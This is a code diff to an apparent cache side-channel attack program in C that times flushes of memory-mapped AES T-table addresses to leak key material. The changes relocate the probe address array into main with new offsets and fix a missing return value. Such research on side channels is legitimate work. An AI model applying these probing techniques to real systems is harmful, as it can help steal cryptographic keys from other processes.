@@ -27,6 +27,8 @@ int ITERATIONS = (20000);
 #define PORT 10000 
 #define SA struct sockaddr 
 
+char* base;
+
 unsigned long long req_sent = 0;
 int garbage_collection_var = 0;
 
@@ -49,10 +51,7 @@ int step_width = 21725;
 int tl_array[T_ARRAY_SIZE] = {160};
 int th_array[T_ARRAY_SIZE] = {278};
 
-// Memory addresses to probe, change it as per T-Table addresses
-char* probe[] = { 
-base + 0x1d3920, base + 0x1d3d20, base + 0x1d4120, base + 0x1d4520
-};
+
 
 // TODO: Optional- change baseline F+R threshold as per baseline calibration results
 int flush_flush_threshold = tl_array[T_ARRAY_SIZE-1];
@@ -66,7 +65,7 @@ int set_affinity(long thread_id, int cpu_id){
     cpu_set_t mask;
     CPU_ZERO(&mask);
     CPU_SET(cpu_id,&mask);
-    pthread_setaffinity_np(thread_id,sizeof(cpu_set_t),&mask);
+    return pthread_setaffinity_np(thread_id,sizeof(cpu_set_t),&mask);
 }
 
 int measure_flush_latency(void* addr){
@@ -284,7 +283,6 @@ unsigned char key[] =
 size_t sum;
 size_t scount;
 
-char* base;
 char* end;
 
 int bot_elems(double *arr, int N, int *bot, int n) {
@@ -382,6 +380,10 @@ int main(int argc, char *argv[])
     map_size += 1;
     }
     base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+    // Memory addresses to probe, change it as per T-Table addresses
+    char* probe[] = { 
+    base + 0x1df000, base + 0x1df400, base + 0x1df800, base + 0x1dfc00
+    };
     end = base + size;
 
     unsigned char plaintext[] =
